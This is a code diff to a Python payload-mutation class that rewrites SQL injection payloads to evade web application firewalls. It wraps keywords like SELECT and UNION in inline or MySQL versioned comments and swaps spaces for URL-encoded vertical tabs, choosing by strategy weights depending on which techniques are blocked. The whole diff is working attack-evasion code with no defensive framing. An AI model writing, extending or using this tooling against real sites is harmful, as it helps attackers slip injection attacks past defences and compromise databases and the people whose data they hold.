@@ -985,6 +985,12 @@ class ASTMutator:
 
     def _junk_filling(self, payload):
         """Adds internal comments to fill space logic without breaking payload endpoints."""
+        if getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0) < 0.5:
+            # If standard comments are blocked, replace spaces with exotic whitespace instead
+            if getattr(self, 'strategy_weights', {}).get("exotic_whitespace", 1.0) > 1.5 and " " in payload:
+                 return payload.replace(" ", "%0b", 1)
+            return payload
+            
         junk = ["bypass", "attack_unit", "audit", "waf_bypass", "X"*8, "1337", "sys"]
         coin = random.random()
         if coin < 0.5 and " " in payload:
@@ -999,15 +1005,22 @@ class ASTMutator:
         """
         mutated = str(payload)
         
+        inline_weight = getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0)
+        exotic_weight = getattr(self, 'strategy_weights', {}).get("exotic_whitespace", 1.0)
+        
         # 1. Comment Wrapping: Wrap keywords or parts of the payload
         keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
         for kw in keywords:
             if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                 coin = random.random()
                 if coin < 0.3:
-                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
+                    if inline_weight > 0.5:
+                        mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
+                    elif exotic_weight > 1.5:
+                         mutated = re.sub(rf'\b{kw}\b', f"%0b{kw}%0b", mutated, flags=re.IGNORECASE)
                 elif coin < 0.6:
-                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)
+                    if inline_weight > 0.5:
+                        mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)
 
         return mutated
 
